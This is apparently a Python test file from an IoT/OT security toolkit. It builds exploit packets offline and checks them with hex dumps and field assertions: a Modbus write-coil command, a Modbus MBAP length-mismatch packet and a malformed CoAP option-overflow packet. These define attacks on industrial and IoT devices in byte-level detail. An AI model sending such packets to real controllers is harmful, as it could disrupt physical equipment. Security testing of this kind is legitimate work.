#!/usr/bin/env python3
"""test_phase2_tools.py — Offline validation of Phase 2 packet construction.

Builds every exploit packet WITHOUT sending it, then validates structure
via hex-dump inspection and field-level assertions.

Run:  python3 -m apiot.tests.test_phase2_tools   (from llm_iot/)
  or: python3 apiot/tests/test_phase2_tools.py
"""

import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from apiot.toolkit.ot_exploits import (
    build_modbus_write_coil_packet,
    build_modbus_overflow_packet,
    build_coap_overflow_packet,
)

PASS = 0
FAIL = 0


def check(label: str, condition: bool, detail: str = ""):
    global PASS, FAIL
    if condition:
        PASS += 1
        print(f"  [PASS] {label}")
    else:
        FAIL += 1
        print(f"  [FAIL] {label}  {detail}")


def hexdump(data: bytes, label: str) -> None:
    print(f"\n  [{label}] {len(data)} bytes:")
    for i in range(0, len(data), 16):
        hexpart = " ".join(f"{b:02x}" for b in data[i:i+16])
        ascpart = "".join(chr(b) if 32 <= b < 127 else "." for b in data[i:i+16])
        print(f"    {i:04x}  {hexpart:<48s}  {ascpart}")


def test_modbus_write_coil():
    print("\n--- Modbus Write Single Coil (FC 0x05) ---")

    for action, expected_val in [("off", 0x0000), ("on", 0xFF00)]:
        pkt = build_modbus_write_coil_packet(action=action)
        hexdump(pkt, f"write_coil action={action}")

        # MBAP header: 7 bytes  +  PDU: 5 bytes  = 12 total
        check(f"[{action}] Total length is 12", len(pkt) == 12, f"got {len(pkt)}")

        # Parse MBAP header
        tx_id, proto_id, length, unit_id = struct.unpack(">HHHB", pkt[:7])
        check(f"[{action}] Protocol ID is 0 (Modbus)", proto_id == 0)
        check(f"[{action}] MBAP length field is 6 (1 unit + 5 PDU)", length == 6)
        check(f"[{action}] Unit ID is 1", unit_id == 1)

        # Parse PDU
        fc = pkt[7]
        coil_addr, coil_val = struct.unpack(">HH", pkt[8:12])
        check(f"[{action}] Function code is 0x05", fc == 0x05)
        check(f"[{action}] Coil address is 0", coil_addr == 0)
        check(f"[{action}] Coil value is 0x{expected_val:04X}", coil_val == expected_val)


def test_modbus_overflow():
    print("\n--- Modbus MBAP Length Overflow ---")

    pkt = build_modbus_overflow_packet()
    hexdump(pkt, "mbap_overflow")

    tx_id, proto_id, claimed_len, unit_id = struct.unpack(">HHHB", pkt[:7])
    actual_pdu_len = len(pkt) - 7

    check("Claimed MBAP length is 2048", claimed_len == 2048)
    check("Actual PDU length is 5", actual_pdu_len == 5, f"got {actual_pdu_len}")
    check("Mismatch ratio > 300x", claimed_len / (actual_pdu_len + 1) > 300)

    fc = pkt[7]
    check("Function code is 0x03 (Read Holding Registers)", fc == 0x03)


def test_coap_overflow():
    print("\n--- CoAP Option Delta/Length Overflow ---")

    pkt = build_coap_overflow_packet()
    hexdump(pkt, "coap_option_overflow")

    check("Total length is 7 bytes", len(pkt) == 7, f"got {len(pkt)}")

    # CoAP header
    ver_type_tkl = pkt[0]
    ver = (ver_type_tkl >> 6) & 0x03
    msg_type = (ver_type_tkl >> 4) & 0x03
    tkl = ver_type_tkl & 0x0F
    code = pkt[1]
    msg_id = struct.unpack(">H", pkt[2:4])[0]

    check("CoAP version is 1", ver == 1)
    check("CoAP type is CON (0)", msg_type == 0)
    check("Token length is 0", tkl == 0)
    check("Code is 0.01 (GET)", code == 0x01)
    check("Message ID is 0x1337", msg_id == 0x1337)

    # Option byte
    opt = pkt[4]
    delta_nibble = (opt >> 4) & 0x0F
    length_nibble = opt & 0x0F
    check("Option delta nibble is 13 (extended)", delta_nibble == 13)
    check("Option length nibble is 13 (extended)", length_nibble == 13)

    ext_delta = pkt[5]
    ext_length = pkt[6]
    check("Extended delta is 0xFF (claims delta=268)", ext_delta == 0xFF)
    check("Extended length is 0xFF (claims 268 bytes of option data)", ext_length == 0xFF)
    check("Zero option value bytes follow (overflow)", len(pkt) == 7,
          "There should be no option value payload")


def main():
    test_modbus_write_coil()
    test_modbus_overflow()
    test_coap_overflow()

    print(f"\n{'='*50}")
    print(f"Results: {PASS} passed, {FAIL} failed out of {PASS + FAIL}")
    print(f"{'='*50}")
    sys.exit(1 if FAIL else 0)


if __name__ == "__main__":
    main()
